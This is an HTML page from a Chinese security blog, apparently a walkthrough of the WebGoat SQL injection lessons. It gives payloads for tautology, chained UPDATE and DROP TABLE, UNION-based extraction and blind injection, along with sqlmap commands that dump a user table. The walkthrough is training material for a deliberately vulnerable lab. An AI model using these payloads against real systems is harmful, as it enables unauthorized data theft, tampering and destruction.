@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon_32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon_16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-bounce.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"upwnothing.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":true,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="WebGoat (A1) Injection 解题思路 上半部分">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebGoat Injection 解题思路 （一）">
+<meta property="og:url" content="https://upwnothing.github.io/zh-CN/3dea2b22/index.html">
+<meta property="og:site_name" content="UPWNothing&#39;s Playground">
+<meta property="og:description" content="WebGoat (A1) Injection 解题思路 上半部分">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://upwnothing.github.io/zh-CN/3dea2b22/1_1_9.png">
+<meta property="og:image" content="https://upwnothing.github.io/zh-CN/3dea2b22/1_1_10.png">
+<meta property="og:image" content="https://upwnothing.github.io/zh-CN/3dea2b22/1_1_10_1.png">
+<meta property="og:image" content="https://upwnothing.github.io/zh-CN/3dea2b22/1_1_11.png">
+<meta property="og:image" content="https://upwnothing.github.io/zh-CN/3dea2b22/1_1_11.png">
+<meta property="og:image" content="https://upwnothing.github.io/zh-CN/3dea2b22/1_2_3.png">
+<meta property="og:image" content="https://upwnothing.github.io/zh-CN/3dea2b22/1_2_3_1.png">
+<meta property="og:image" content="https://upwnothing.github.io/zh-CN/3dea2b22/1_2_5.png">
+<meta property="og:image" content="https://upwnothing.github.io/zh-CN/3dea2b22/1_2_5_1.png">
+<meta property="og:image" content="https://upwnothing.github.io/zh-CN/3dea2b22/1_2_5_2.png">
+<meta property="og:image" content="https://upwnothing.github.io/zh-CN/3dea2b22/1_2_5_3.png">
+<meta property="og:image" content="https://upwnothing.github.io/zh-CN/3dea2b22/1_2_5_4.png">
+<meta property="og:image" content="https://upwnothing.github.io/zh-CN/3dea2b22/1_2_5_5.png">
+<meta property="og:image" content="https://upwnothing.github.io/zh-CN/3dea2b22/1_2_6.png">
+<meta property="article:published_time" content="2020-11-02T03:56:09.000Z">
+<meta property="article:modified_time" content="2020-11-02T03:56:51.757Z">
+<meta property="article:author" content="UPWNothing">
+<meta property="article:tag" content="Pentest">
+<meta property="article:tag" content="WebGoat">
+<meta property="article:tag" content="OWASP Top10">
+<meta property="article:tag" content="SQLMap">
+<meta property="article:tag" content="SQL Injection">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://upwnothing.github.io/zh-CN/3dea2b22/1_1_9.png">
+
+<link rel="canonical" href="https://upwnothing.github.io/zh-CN/3dea2b22/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<script type="text/javascript">
+    // Wait for the page to load first
+    var _prevOnload = window.onload;
+    window.onload = function() {
+        var switchLang = document.getElementById("menu").getElementsByClassName("menu-item-switch_lang")[0].childNodes[1];
+            var href = window.location.href;     
+            var indexOfEn = href.toLowerCase().indexOf('/en/');
+            if(indexOfEn !== -1) {
+                //switchLang.href = href.replace('/en/', '/');
+		//switchLang.href = "https://upwnothing.github.io";
+                switchLang.href = href.substr(0,indexOfEn);
+            }
+            else {
+                //switchLang.href = href.replace(/(^http[s]?:\/\/[a-z0-9.]*[:?0-9]*\/)(.*)/i, '$1en/$2');
+		//switchLang.href = "https://upwnothing.github.io/en";
+            }
+    }
+</script>
+<script data-ad-client="ca-pub-2179953596008833" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+  <title>WebGoat Injection 解题思路 （一） | UPWNothing's Playground</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-125116918-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-125116918-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">UPWNothing's Playground</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">一个关于安全的小宝箱</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">21</span></a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-switch_lang">
+
+    <a href="/en/" rel="section"><i class="fa fa-language fa-fw"></i>-->English</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://upwnothing.github.io/zh-CN/3dea2b22/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/icon.jpeg">
+      <meta itemprop="name" content="UPWNothing">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="UPWNothing's Playground">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          WebGoat Injection 解题思路 （一）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-11-02 11:56:09 / 修改时间：11:56:51" itemprop="dateCreated datePublished" datetime="2020-11-02T11:56:09+08:00">2020-11-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Security/Web-Application/" itemprop="url" rel="index"><span itemprop="name">Web Application</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/zh-CN/3dea2b22/" class="post-meta-item leancloud_visitors" data-flag-title="WebGoat Injection 解题思路 （一）" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/zh-CN/3dea2b22/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/zh-CN/3dea2b22/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+            <div class="post-description">WebGoat (A1) Injection 解题思路 上半部分</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="WebGoat-版本信息"><a href="#WebGoat-版本信息" class="headerlink" title="WebGoat 版本信息"></a>WebGoat 版本信息</h1><ul>
+<li>WebGoat v8.1.0</li>
+</ul>
+<h1 id="A1-Injection-注入"><a href="#A1-Injection-注入" class="headerlink" title="(A1) Injection 注入"></a>(A1) Injection 注入</h1><h2 id="SQL-Injection-intro"><a href="#SQL-Injection-intro" class="headerlink" title="SQL Injection (intro)"></a>SQL Injection (intro)</h2><h3 id="1-Concept"><a href="#1-Concept" class="headerlink" title="1 - Concept"></a>1 - Concept</h3><p>介绍SQL的基本概念，仔细阅读即可。</p>
+<h3 id="2-What-is-SQL"><a href="#2-What-is-SQL" class="headerlink" title="2 - What is SQL?"></a>2 - What is SQL?</h3><p>简单了解SQL语句。测试如何使用 <strong>SELECT语句</strong>进行查询。<br>这个非常简单：</p>
+<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> department <span class="keyword">from</span> employees <span class="keyword">where</span> userid=<span class="number">96134</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-DML"><a href="#3-DML" class="headerlink" title="3 - DML"></a>3 - DML</h3><p>SQL语句除去SELECT查询之外，还有Insert, Update等添加、修改数据的操作。</p>
+<p>测试内容为将<code>Tobi Barnett</code>的部门修改为<code>Sales</code>。这个也相对容易：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Update</span> employees <span class="keyword">set</span> department = <span class="string">'Sales'</span> <span class="keyword">where</span> userid = <span class="number">89762</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-DDL"><a href="#4-DDL" class="headerlink" title="4 - DDL"></a>4 - DDL</h3><p>这一节介绍了如何使用SQL语句修改数据库中表的结构。测试内容是为<code>employees</code>表添加一个名为<code>phone</code>的列，数据类型为<code>varchar(20)</code>。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> employees <span class="keyword">ADD</span> phone <span class="type">varchar</span>(<span class="number">20</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-DCL"><a href="#5-DCL" class="headerlink" title="5 - DCL"></a>5 - DCL</h3><p>这一节的内容是通过SQL语言管理用户进入及操作数据库的权限。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="keyword">TO</span> UnauthorizedUser</span><br></pre></td></tr></table></figure>
+
+<p>到此为止，就完成了对于SQL语句的初步认识与学习。如果对于SQL语言的其他操作还存在什么问题的话，可以在<a href="https://www.w3schools.com/sql/default.asp" target="_blank" rel="noopener">w3school SQL</a>进行学习。</p>
+<h3 id="6-amp-7-amp-8-What-is-SQL-injection"><a href="#6-amp-7-amp-8-What-is-SQL-injection" class="headerlink" title="6 &amp; 7 &amp; 8 - What is SQL injection?"></a>6 &amp; 7 &amp; 8 - What is SQL injection?</h3><p>这几节介绍了SQL注入的基本原理，可能产生的影响以及SQL注入的严重性。如果之前对于 <strong>SQL注入</strong> 已经有了基本的了解，那么这一步可以简单跳过。 如果对于 <strong>SQL注入</strong> 还没有任何的概念，请务必仔细阅读这里的内容。</p>
+<p>这三节没有任何交互性的内容。</p>
+<h3 id="9-Try-It"><a href="#9-Try-It" class="headerlink" title="9 - Try It!"></a>9 - Try It!</h3><p>最最基本的注入结构。明文测试来感受一下如何构造一个成功的SQL注入语句。</p>
+<p><img data-src="/zh-CN/3dea2b22/1_1_9.png" alt="Try It!"></p>
+<h3 id="10-Numeric-SQL-Injection"><a href="#10-Numeric-SQL-Injection" class="headerlink" title="10 - Numeric SQL Injection"></a>10 - Numeric SQL Injection</h3><p>稍微提高了一些难度。SQL语句从页面接受了两个不同的用户输入，但是其中只有一个可以成功进行SQL注入。我们需要找到正确的输入域，并利用。</p>
+<p>先简单尝试：<br><img data-src="/zh-CN/3dea2b22/1_1_10.png" alt="10"></p>
+<p>看到了错误提示为： 无法成功将Login_Count的值解析为数字。</p>
+<p>所以再次尝试对User_id的值进行注入：</p>
+<p><img data-src="/zh-CN/3dea2b22/1_1_10_1.png" alt="Success!"></p>
+<h3 id="11-String-SQL-Injection"><a href="#11-String-SQL-Injection" class="headerlink" title="11 - String SQL Injection"></a>11 - String SQL Injection</h3><p>类似于第9个小测试的内容。只不过这次不再是选择题了。在<code>Employee Name</code>的输入框输入：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or <span class="number">1</span>=<span class="number">1</span> --</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/zh-CN/3dea2b22/1_1_11.png" alt></p>
+<h3 id="12-Compromising-Integrity-with-Query-chaining"><a href="#12-Compromising-Integrity-with-Query-chaining" class="headerlink" title="12 - Compromising Integrity with Query chaining"></a>12 - Compromising Integrity with Query chaining</h3><p>同样的输入框。但这次不同于之前的仅仅是获取到全部员工的列表信息，这次我们需要真真切切地做些坏事了。这个挑战的要求是，将数据库中自己的工资修改为最高。</p>
+<p>思路是使用分号分隔两句SQL语句，并在第二句使用UPDATE命令对数据进行更新。因此，我们可以在<code>Employee Name</code>的输入框输入：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or <span class="number">1</span>=<span class="number">1</span>; Update employees SET SALARY=<span class="number">99999</span> where AUTH_TAN=<span class="number">3</span>SL99A --</span><br></pre></td></tr></table></figure>
+
+<p>OK,顺利让自己的工资变成最高了！！（千万别在真实的生产环境中做同样的事情！！）</p>
+<p><img data-src="/zh-CN/3dea2b22/1_1_11.png" alt></p>
+<h3 id="13-Compromising-Availability"><a href="#13-Compromising-Availability" class="headerlink" title="13 - Compromising Availability"></a>13 - Compromising Availability</h3><p>题目要求在<code>access_log</code>表中删除被系统记录下的SQL语句执行记录。</p>
+<p>与上一题思路相同，再第二句SQL语句中执行 <strong>DROP</strong> 命令，删除<code>access_log</code>表中的数据。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d'; <span class="keyword">drop</span> <span class="keyword">TABLE</span> access_log <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>成功！</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这一小节介绍了SQL注入中一些最为基础的概念。并通过一个比较真实的场景，来展现了一个攻击者在面对一个存在漏洞的系统时，可以实现哪些操作。</p>
+<p>当然，由于这一部分主要是面对刚刚入门的初学者，为了更好的实现展示的目的，所以这一部分中的漏洞非常的显而易见，也非常容易利用。而在实际的生产环境中，大多数的漏洞并不是那么简单地就能被利用。下一节就要尝试更困难的挑战了！</p>
+<h2 id="SQL-Injection-advanced"><a href="#SQL-Injection-advanced" class="headerlink" title="SQL Injection (advanced)"></a>SQL Injection (advanced)</h2><h3 id="1-2"><a href="#1-2" class="headerlink" title="1,2"></a>1,2</h3><p>这两节简单得介绍了SQL注入实操的一些基本技巧。这些技巧其实非常有用，虽然我们可以使用SQL Map这类的工具来帮助我们完成一些自动化的SQL注入操作，但是对于基本原理的理解可以让你最大化发挥出工具的价值。</p>
+<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>这里需要通过SQL注入获取数据库中表的完整信息，而且这次我们已经不满足于获得当前的数据表。我们还需要同时获取另一张表中的内容。这里我们可以使用<code>UNION SELECT</code>语句来实现两张表的数据拼接：</p>
+<p><code>d&#39; and 1=2 UNION SELECT user_system_data.*,NULL,NULL,NULL from user_system_data --</code></p>
+<p>这里需要注意的有两点：  </p>
+<ul>
+<li>使用UNION SELECT 需要前后两张表的列数相匹配。由于题目中已知的信息告诉我们<code>user_system_data</code>中只有4列数据，所以我们需要手动填充3列<code>NULL</code>。</li>
+<li>一开始写的是<code>UNION SELECT *</code>,结果可以看到报错为: <code>duplicate column name in derived table</code>。不难理解，两张表中都有<code>userid</code>列，而第二张表的<code>userid</code>还是主键。所以我们需要在<code>*</code>前指定表名。</li>
+</ul>
+<p><img data-src="/zh-CN/3dea2b22/1_2_3.png" alt></p>
+<p>根据正确答案提示，这道题还可以直接拼接SQL语句。这个实现起来就更简单了：</p>
+<p><code>d&#39;; SELECT * from user_system_data</code> </p>
+<p><img data-src="/zh-CN/3dea2b22/1_2_3_1.png" alt></p>
+<p>输入Dave的密码： <code>passW0rD</code> 最终完成。 </p>
+<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>这边介绍了SqL盲注。之前的挑战中，页面上会返回完整的信息，包括了数据库的报错信息还有完整的查询结果。但在现实的环境中，大多数的情况是，数据库仅会返回查询是成功还是失败。在这种情况下，我们每次可以从数据库获得的信息会大大减少，这也很大程度增加了注入的难度。</p>
+<p>这一节的说明简要解释了两种最常见的盲注方法： <strong>基于内容的盲注</strong> 和 <strong>基于时间的盲注</strong> </p>
+<h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>来吧，亲自尝试一下！！</p>
+<p>这里我们看到了一个最为常见的功能：登录与注册。我们需要最终以Tom的身份登录进系统。</p>
+<p><img data-src="/zh-CN/3dea2b22/1_2_5.png" alt></p>
+<p>简单尝试使用SQL注入绕过登录，发现失败了。然后尝试在Register功能中注入。</p>
+<p><img data-src="/zh-CN/3dea2b22/1_2_5_1.png" alt></p>
+<p>可以看到系统会返回说用户已经存在的消息。尝试简单修改用户名，快速检验是否存在注入的可能：</p>
+<p><code>tom&#39; and 1=1 --</code></p>
+<p>系统返回了以下信息：</p>
+<figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span> &#123;<span class="number">0</span>&#125; <span class="keyword">already</span> <span class="keyword">exists</span> <span class="keyword">please</span> <span class="keyword">try</span> <span class="keyword">to</span> <span class="keyword">register</span> <span class="keyword">with</span> <span class="keyword">a</span> <span class="keyword">different</span> <span class="keyword">username</span>.</span><br></pre></td></tr></table></figure>
+
+<p>这个<code>{0}</code>看着颇为可疑…感觉可能是个能够利用的点。使用BurpSuite截取请求：</p>
+<p><img data-src="/zh-CN/3dea2b22/1_2_5_2.png" alt></p>
+<p>将请求保存到本地文件，并使用<code>sqlmap -r webgoat_1.2.5_register.txt</code>对这个请求进行SQL注入的测试。</p>
+<p><img data-src="/zh-CN/3dea2b22/1_2_5_3.png" alt></p>
+<p>很显然，<code>username_reg</code>这个参数存在SQL注入的漏洞。因此，我们进一步利用 <strong>SQL Map</strong> 来通过这个注入点，获取更多数据库信息。基于上一次运行的结果，我们使用下列命令来列出数据库中所有的DB列表：</p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">sqlmap</span> <span class="literal">-</span><span class="comment">r</span> <span class="comment">webgoat_1</span><span class="string">.</span><span class="comment">2</span><span class="string">.</span><span class="comment">5_register</span><span class="string">.</span><span class="comment">txt</span> --<span class="comment">dbms=HSQLDB</span> --<span class="comment">thread</span> <span class="comment">5</span> --<span class="comment">dbs</span> --<span class="comment">no</span><span class="literal">-</span><span class="comment">cast</span> --<span class="comment">technique=B</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/zh-CN/3dea2b22/1_2_5_4.png" alt></p>
+<p>我们获取到了5个数据库。再指定数据库为<code>PUBLIC</code>获取该数据中所有的表名。同时我们注意到，这个时候执行的速度明显减慢了很多，所以我们可以在参数中加入<code>--string=&quot;already exists please try to register with a different username&quot;</code>指定查询为真的条件。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r webgoat_1.2.5_register.txt <span class="params">--string=</span><span class="string">"already exists please try to register with a different username"</span> <span class="params">--dbms=HSQLDB</span> <span class="params">--thread</span> 10 <span class="params">--technique=B</span> -D PUBLIC <span class="params">--tables</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/zh-CN/3dea2b22/1_2_5_5.png" alt></p>
+<p>成功获取到所有的表名。其中<code>SQL_CHALLENGE_USERS</code>看着就非常像我们需要获取信息的表。尝试直接下载这张表里的内容：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r webgoat_1.2.5_register.txt <span class="params">--string=</span><span class="string">"already exists please try to register with a different username"</span> <span class="params">--dbms=HSQLDB</span> <span class="params">--thread</span> 10 <span class="params">--technique=B</span> -D PUBLIC -T SQL_CHALLENGE_USERS <span class="params">--dump</span></span><br></pre></td></tr></table></figure>
+
+<p>运行的时候才发现，这个数据库居然还是有快200行…那直接dump确实有点暴力了…(大笑)。有不少是运行SQLMap的时候自己注册进去的!!所以我们采用一个更有针对性的方法：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r webgoat_1.2.5_register.txt <span class="attribute">--string</span>=<span class="string">"already exists please try to register with a different username"</span> <span class="attribute">--dbms</span>=HSQLDB --thread 10 <span class="attribute">--technique</span>=B -D PUBLIC -T SQL_CHALLENGE_USERS <span class="attribute">--sql-query</span>=<span class="string">"SELECT userid,password FROM SQL_CHALLENGE_USERS WHERE USERID='tom'"</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/zh-CN/3dea2b22/1_2_6.png" alt></p>
+<p>顺利获得密码！登录即可。</p>
+<blockquote>
+<p>当然，这道题同样可以在password参数中爆破出密码，这里只是给出了一种完全使用SQLMap的思路。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+      
+  <div class="popular-posts-header">你可能感兴趣的文章</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/zh-CN/a0ebb04/" rel="bookmark">WebGoat安装运行步骤</a></div>
+    </li>
+  </ul>
+
+        <div class="reward-container">
+  <div>觉得好的话不妨赏一杯奶茶吧～</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="UPWNothing 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.png" alt="UPWNothing 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/bitcoin.png" alt="UPWNothing 比特币">
+        <p>比特币</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pentest/" rel="tag"># Pentest</a>
+              <a href="/tags/WebGoat/" rel="tag"># WebGoat</a>
+              <a href="/tags/OWASP-Top10/" rel="tag"># OWASP Top10</a>
+              <a href="/tags/SQLMap/" rel="tag"># SQLMap</a>
+              <a href="/tags/SQL-Injection/" rel="tag"># SQL Injection</a>
+          </div>
+
+        
+  <div class="post-widgets">
+    <div class="wp_rating">
+      <div id="wpac-rating"></div>
+    </div>
+  </div>
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/zh-CN/a0ebb04/" rel="prev" title="WebGoat安装运行步骤">
+      <i class="fa fa-chevron-left"></i> WebGoat安装运行步骤
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
